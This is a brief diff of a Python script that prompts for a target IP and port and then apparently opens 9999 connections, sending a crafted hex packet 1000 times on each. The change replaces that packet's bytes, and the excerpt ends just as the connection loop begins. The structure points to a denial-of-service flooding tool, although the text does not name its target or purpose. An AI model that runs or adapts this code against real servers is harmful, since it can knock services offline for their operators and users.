@@ -5,7 +5,7 @@ ip = input("IP: ")
 port = int(input("Port: "))
 num_connections = 9999
 
-packet = bytes.fromhex("F10400010900000001000000F2")
+packet = bytes.fromhex("F10400020900000001000000F3")
 num_send_per_connection = 1000
 
 for _ in range(num_connections):
